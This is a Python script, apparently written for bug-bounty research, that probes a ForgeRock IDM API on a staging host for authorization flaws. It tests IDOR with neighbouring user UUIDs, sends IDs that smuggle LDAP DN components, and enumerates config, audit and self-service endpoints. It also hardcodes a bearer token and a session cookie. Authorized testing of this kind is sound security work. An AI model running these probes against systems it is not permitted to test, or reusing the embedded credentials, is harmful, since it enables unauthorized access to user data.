# -*- coding: utf-8 -*-
"""AIC 第八轮:用 fr:idm:* scope token 测 IDM API 授权边界
预期结果表:
  成立 -> 只能读/写自己的 managed user;他人 id 403/404;config/schema 拒绝
  不成立(发现) -> 可读他人/全量用户、可写他人、可读配置(IDOR/越权)
"""
import requests, urllib3, json
urllib3.disable_warnings()

BASE = 'https://openam-bug-bounty-stag.forgeblocks.com'
TOKEN = 'eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJkYjNkNjM1Ni02MWEwLTQ2ODQtOWVhYS1jMTM1M2RmYTQ0ZDkiLCJjdHMiOiJPQVVUSDJfU1RBVEVMRVNTX0dSQU5UIiwiYXV0aF9sZXZlbCI6MCwiYXVkaXRUcmFja2luZ0lkIjoiZWFiYWVmY2UtODJkZi00NDYyLTkwZTctMTk1YmZkNTAwMDQ1LTM4ODYzNiIsInN1Ym5hbWUiOiJkYjNkNjM1Ni02MWEwLTQ2ODQtOWVhYS1jMTM1M2RmYTQ0ZDkiLCJpc3MiOiJodHRwczovL29wZW5hbS1idWctYm91bnR5LXN0YWcuZm9yZ2VibG9ja3MuY29tOjQ0My9hbS9vYXV0aDIvYWxwaGEiLCJ0b2tlbk5hbWUiOiJhY2Nlc3NfdG9rZW4iLCJ0b2tlbl90eXBlIjoiQmVhcmVyIiwiYXV0aEdyYW50SWQiOiI0a3JYWWRsWVdmX2tKZ2ZWRjVGUWlsb09XdFkiLCJjbGllbnRfaWQiOiJlbmRVc2VyVUlDbGllbnQiLCJhdWQiOiJlbmRVc2VyVUlDbGllbnQiLCJuYmYiOjE3ODgyNDc4NzAsImdyYW50X3R5cGUiOiJhdXRob3JpemF0aW9uX2NvZGUiLCJzY29wZSI6WyJmcjppZG06KiJdLCJhdXRoX3RpbWUiOjE3ODgyNDc4NjUsInJlYWxtIjoiL2FscGhhIiwiZXhwIjoxNzg4MjUxNDcwLCJpYXQiOjE3ODgyNDc4NzAsImV4cGlyZXNfaW4iOjM2MDAsImp0aSI6IlFoM2FQQ2Z0SFR4bEx6cElHUlNkekwwSFIyVSJ9.ustwJpOA-B0vA9J0aQm1UueFlyaEp5fKUzwe4EaryX8'
COOKIE = 'amlbcookie=01; aa942d46ece12ce=tvVfNxaXuVbrr2BzbooZZTz8iTk.*AAJTSQACMDIAAlNLABxZNXdTYkVsVmxPdWdiRlZkeDc3V3doNTJ1VTg9AAR0eXBlAANDVFMAAlMxAAIwMQ..*'
MY_ID = 'db3d6356-61a0-4684-9eaa-c1353dfa44d9'

S = requests.Session()
S.trust_env = False
S.proxies = {'http': None, 'https': None}
S.headers.update({'User-Agent': 'research-1643',
                  'Authorization': 'Bearer ' + TOKEN,
                  'Cookie': COOKIE,
                  'Accept-API-Version': 'resource=1.0, protocol=1.0'})

def probe(method, path, **kw):
    try:
        r = S.request(method, BASE + path, timeout=12, verify=False, **kw)
        print('%-5s %-75s -> %d  %s' % (method, path, r.status_code, r.text[:280].replace('\n', ' ')))
        return r
    except Exception as e:
        print('%-5s %-75s -> ERR %s' % (method, path, str(e)[:60]))

print('=== 1. token 有效性(userinfo) ===')
probe('GET', '/am/oauth2/alpha/userinfo')

print('\n=== 2. IDM managed user 面 ===')
probe('GET', '/openidm/managed/user?_queryFilter=true&_pageSize=5')
probe('GET', '/openidm/managed/user/' + MY_ID)
probe('GET', '/openidm/managed/user?_queryId=query-all')
probe('GET', '/openidm/managed/user?_action=query&_queryFilter=true')

print('\n=== 3. IDOR:他人 id ===')
# 邻近 UUID 变体
for uid in ['db3d6356-61a0-4684-9eaa-c1353dfa44d8',
            'db3d6356-61a0-4684-9eaa-c1353dfa44da',
            'db3d6356-61a0-4684-9eaa-c1353dfa44d9%2Cou%3Duser%2Co%3Dalpha',
            'db3d6356-61a0-4684-9eaa-c1353dfa44d9,ou=user,o=alpha']:
    probe('GET', '/openidm/managed/user/' + uid)

print('\n=== 4. 配置/其他资源面 ===')
for p in ['/openidm/config', '/openidm/config/selfservice',
          '/openidm/schema/managed_user', '/openidm/managed',
          '/openidm/endpoint/selfservice', '/openidm/endpoint/usernotifications',
          '/openidm/system', '/openidm/recon', '/openidm/audit',
          '/openidm/privilege', '/openidm/policy',
          '/openidm/selfservice/registration',
          '/openidm/selfservice/password/reset',
          '/openidm/selfservice/profile',
          '/openidm/selfservice/forgotUsername']:
    probe('GET', p)
